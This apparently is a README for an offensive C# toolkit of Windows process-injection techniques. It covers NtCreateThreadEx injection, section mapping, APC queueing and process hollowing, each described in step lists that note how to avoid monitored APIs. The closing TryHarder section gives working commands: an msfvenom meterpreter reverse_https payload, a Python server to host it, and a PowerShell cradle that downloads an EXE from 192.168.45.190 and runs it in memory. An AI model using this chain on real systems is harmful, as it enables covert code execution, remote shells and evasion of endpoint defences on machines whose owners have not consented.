## **NativeProcInjection.cs**

This technique demonstrates classic process injection using Native Windows API functions. It creates a remote process (usually `notepad.exe`), allocates memory in it, writes shellcode, and creates a remote thread to execute the payload.

**High-Level Steps:**

1. Obtain a handle to the target process using `NtOpenProcess`.
2. Allocate memory in the remote process with `NtAllocateVirtualMemory`.
3. Write shellcode into the allocated memory using `NtWriteVirtualMemory`.
4. Create a remote thread in the target process using `NtCreateThreadEx` to execute the shellcode.

## **NtMapInjection.cs**

This method utilizes NT native APIs to create a shared memory section and map it into both the local and remote process. It’s stealthier than the classic method and avoids using easily-monitored APIs like `WriteProcessMemory`.

**High-Level Steps:**
1. Create a memory section using `NtCreateSection`.
2. Map the section into the local process using `NtMapViewOfSection`.
3. Copy the shellcode into the local view.
4. Map the same section into the remote process using `NtMapViewOfSection`.
5. Create a remote thread in the target process with `CreateRemoteThread` or equivalent to execute the code.

## **NtQueueApc.cs**

This method uses Asynchronous Procedure Calls (APCs) to queue execution of shellcode in the context of a thread in a remote process. It is often used in combination with other techniques to delay execution or avoid detection.

**High-Level Steps:**

1. Create a new process in a suspended state using `CreateProcess` with the CREATE_SUSPENDED flag.
2. Allocate memory in the target process with `NtAllocateVirtualMemory`.
3. Write the shellcode into the allocated memory using `NtWriteVirtualMemory`.
4. Queue the shellcode for execution in the suspended thread using `NtQueueApcThread`.
5. Resume the main thread using `NtResumeThread` to trigger the APC and execute the payload.

## **procHollow.cs**

An advanced injection technique where a legitimate process is started in a suspended state, its memory is unmapped, and malicious code is written into it—effectively "hollowing out" the original process. The thread is then resumed, executing the injected payload under the guise of a legitimate executable.

**High-Level Steps:**

1. Create a target process (e.g., svchost.exe) in a suspended state using CreateProcess with CREATE_SUSPENDED.
2. Retrieve the base address of the main module using NtQueryInformationProcess and ReadProcessMemory.
3. Unmap the memory of the original executable using NtUnmapViewOfSection.
4. Allocate memory in the remote process using VirtualAllocEx.
5. Write the malicious executable (often a PE file) into the allocated memory using WriteProcessMemory.
6. Update the remote process’s context (entry point) with SetThreadContext.
7. Resume the main thread with ResumeThread to execute the injected payload.

## **TryHarder.cs**

Another Process Injection technique that loads the shellcode remotely.<br>
The idea of this technique is by `Sektor 7` and ported to C# by [saulgoodman](https://github.com/saulg00dmin).

Create Shellcode using msfvenom:<br>
- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin`

Serve the `shellcode.bin` with python server: `python3 -m http.server 80`

Convert the EXE into a byte array:<br>
- `$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.190/Tryharder.exe')`

Load the EXE into memory:<br>
- `$assem = [System.Reflection.Assembly]::Load($data)`

Invoke its entry point:
- `$assem.EntryPoint.Invoke($null, @([string[]]@()))`
